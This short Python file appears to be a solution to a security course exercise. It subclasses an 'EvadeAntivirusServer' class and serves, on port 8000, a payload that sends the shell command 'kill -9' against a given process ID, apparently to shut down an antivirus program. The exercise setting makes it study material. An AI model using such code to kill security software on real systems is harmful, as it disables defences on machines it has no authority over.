import server
import struct
import os
import signal
import subprocess

class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):

        #os.kill(pid,signal.SIGKILL)        
        #quit() 

        return "kill -9 "+str(pid)

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
     
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

